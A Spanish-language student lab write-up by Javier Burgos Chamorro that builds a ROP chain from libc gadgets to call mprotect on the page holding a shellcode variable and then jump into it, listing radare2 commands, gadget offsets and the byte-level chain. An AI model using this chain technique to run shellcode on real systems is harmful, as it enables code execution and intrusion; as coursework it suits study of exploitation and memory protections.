Trabajo realizado por Javier Burgos Chamorro

*Introduccion 
El obejtivo de esta practicar  es  fusionar el  ocdigo de shellcode de la practica anterior , con una cadade ROP
la cual  nos permitira cambair  los permisos de la pagina que alamacena nuestra variable shellcode,para poder asi
ejcutarla con los permisos  correspondientes.
Para esto se aprovecha nuestra cadena  ROP de una serie de gadgets que nos permiten hacer dichas acciones.

*Los pasos  a realizar son los siguientes:
-Obtenmos la la dirección base de la libc,  para ello compilamos rop.c y despues usaremos radare 2 para con el
ejcutable, al debuggearlo obtenenmos la dirección del  mapa de  memori.
Loss comandos usados para copilar son estos :
gcc rop.c -o rop
para copilar y sacar el ejutable y luego:
Y luego para el  debugg:
radare2 -d rop
db main
dc
Esto para que  nos de  la dirrecion grepeando para que  nos sea mas fácil:
dm | grep libc
La dirección de la libc es la primera salida que nos da en este caso:
0x00007ffff7e00000

-Luego necesitamos  la dirección de  memoria de nuestro shellcode para poder redirecionar a esa varible .
Asi que al estar debuggeando ya con el rop  de el paso anterior aprovechamos y sacamos la dirección del 
shellcode con este comando.
is | grep shellcode
Como salida  nos da la direccion 0x555555558040 pero  hay un problema y es que la varible ocupa dos 
páginas de memoria ,por lo que la primera página de memoria que ocupa es 0x555555558000 que es la que utilizaremos 
como tamaño posteriormente.

-Tercer paso es sacar los gadgets, y sacarlos a un txt con  estos comandos:
cd /usr/lib/x86_64-linux-gnu/
radare2 libc.so.6
aaa
e asm.syntax=att
e search.in=bin.sections.exec
/R ret > /home/mal/gadgets.txt
quit
Esto  nos saca en el directorio /home/mal el txt ;gadgets.txt.

-Ahora para elegir los gadgets tenemos que tener claro que  vamos a necesitar:
 1=Tenmos que usar la llamada al sistema mprotect.Por lo que hay que poner el rax a 10.
 2=Luego  necesimaos  la direccion de la pagina  a la que  queremos  cambiar los  permisos.
   Para ello en el registro rdi ponemos 0x555555558000 que es la dirreción de la página.
 3=Luego poner el tamaño de dicha página , para eso  en rsi metemos 0x2000  que seria  los  
   8K bytes  que tiene  la  página en hex.
 4=Hay que  configuar los permisos , para poder ejecutar esto se traduce  a poner en %rdx el  valor 0x7 
  el cual nos concede los permisos necesarios.
 5=Por  ultimo necesimatos llamar  al syscall el cual tendrá una  instrucción retq para que salte a la dirreción
   0x555555558040 que es la de  la varible  shellcode.
 
-Para esto los gadgets  usados son :

  0x0003f040               4058  popq %rax
  				 retq
  0x000bcfbd                 5f  popq %rdi
                                 retq
  0x000c633d                 5e  popq %rsi
                                 retq
  0x000cb1cd                 5a  popq %rdx
                                 retq
  0x000580da               0f05  syscall 
                                 retq

-Finalemente  creamos el nuevo stack usando las direcciones anteriores  de los  gadgets  completando con los
parametros de cada popq correspondiente y  a esto  se le combina con   la dirreción de la base de la libc .
De tal manera  que  esto queda asi:
   //0x00007ffff7e00000
    
    0x40, 0xf0, 0xe3, 0xf7, 0xff, 0x7f, 0x00, 0x00,   // popq %rax  
    0x0a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // 10
    
    0xbd, 0xcf, 0xeb, 0xf7, 0xff, 0x7f, 0x00, 0x00,  // popq %rdi    
    0x00, 0x80, 0x55, 0x55, 0x55, 0x55, 0x00, 0x00,// 0x555555558000

    0x3d, 0x63, 0xec, 0xf7, 0xff, 0x7f, 0x00, 0x00,   // popq %rsi
    0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // 0x2000 8k 

    0xcd, 0xb1, 0xec, 0xf7, 0xff, 0x7f, 0x00, 0x00,  // popq %rdx 
    0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // 0x7 permisos

    0xda, 0x80, 0xe5, 0xf7, 0xff, 0x7f, 0x00, 0x00,  //   syscall
    0x40, 0x80, 0x55, 0x55, 0x55, 0x55, 0x00, 0x00   // shellcode


Todo esto se introduce  en la variable newstack pues es  nuestra cadena rop.Copilamos otra vez y deberia funcionar 
correctamente todo.






